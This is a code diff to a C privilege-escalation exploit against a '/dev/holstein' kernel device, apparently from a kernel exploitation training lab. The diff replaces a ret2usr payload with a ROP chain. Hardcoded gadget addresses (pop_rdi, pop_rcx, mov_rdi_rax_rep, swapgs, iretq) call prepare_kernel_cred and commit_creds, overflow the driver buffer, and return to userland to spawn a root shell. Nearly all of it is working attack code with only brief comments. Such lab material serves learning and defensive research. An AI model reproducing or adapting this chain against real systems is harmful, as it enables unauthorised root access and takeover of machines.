@@ -16,7 +16,17 @@
 #include <pthread.h>
 
 #define DEVICE "/dev/holstein"
+#define BUFFER_SIZE 0x400/0x8
 
+// rep: This is a prefix that stands for "repeat." 
+// It tells the CPU to repeat the following instruction 
+// a number of times based on the value in the RCX register. 
+// Specifically, it decrements RCX after each iteration until it reaches zero.
+unsigned long mov_rdi_rax_rep = 0xffffffff8160c96b;
+unsigned long pop_rdi = 0xffffffff8127bbdc;
+unsigned long pop_rcx = 0xffffffff812ea083;
+unsigned long swapgs = 0xffffffff8160bf7e;
+unsigned long iretq = 0xffffffff810202af;
 unsigned long prepare_kernel_cred = 0xffffffff8106e240;
 unsigned long commit_creds = 0xffffffff8106e390;
 long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;
@@ -33,38 +43,6 @@ void save_state() {
         );
 
     printf("[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n", _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
-}
-
-void restore_state() {
-    asm volatile(
-        ".intel_syntax noprefix;"
-        "swapgs;" 
-        "mov r15, _proc_ss;"
-        "push r15;"
-        "mov r15, _proc_rsp;"
-        "push r15;"
-        "mov r15, _proc_rflags;"
-        "push r15;"
-        "mov r15, _proc_cs;"
-        "push r15;"
-        "lea r15, spawn_shell;" 
-        "push r15;"
-        "iretq;"
-        ".att_syntax"
-        );
-}
-
-void escalate_privilege() {
-    // was initially put save state here, but since we still executing
-    // in the kernel context, save state will cause a crash, we need
-    // to save the state in the user land context anyways
-    // save_state();
-
-    char * (*pkc)(int) = (void *)prepare_kernel_cred;
-    void (*cc)(char *) = (void *)commit_creds;
-    (*cc)((*pkc)(0));
-
-    restore_state();
 }
 
 void spawn_shell()
@@ -89,10 +67,24 @@ int main(int argc, char *argv[]){
     }
     printf("[+] device opened at: %d\n", fd);
 
-    char payload[0x500] = {0x0};
-    *(unsigned long *)(&payload[0x408]) = (unsigned long) &escalate_privilege;
-    printf("[*] expected rip: %p\n", &escalate_privilege);
-    if (write(fd, payload, 0x410)) {
+    unsigned long payload[BUFFER_SIZE+0x20] = {0x0};
+    unsigned long* chain = &payload[BUFFER_SIZE+0x1];
+    *chain++ = pop_rdi;
+    *chain++ = 0x0;
+    *chain++ = prepare_kernel_cred;
+    *chain++ = pop_rcx;
+    *chain++ = 0x0;
+    *chain++ = mov_rdi_rax_rep;
+    *chain++ = commit_creds;
+    *chain++ = swapgs;
+    *chain++ = iretq;
+    *chain++ = (unsigned long) &spawn_shell;
+    *chain++ = _proc_cs;
+    *chain++ = _proc_rflags;
+    *chain++ = _proc_rsp;
+    *chain++ = _proc_ss;
+
+    if (write(fd, payload, sizeof(payload))) {
         perror("[-] write");
         exit(1);
     }
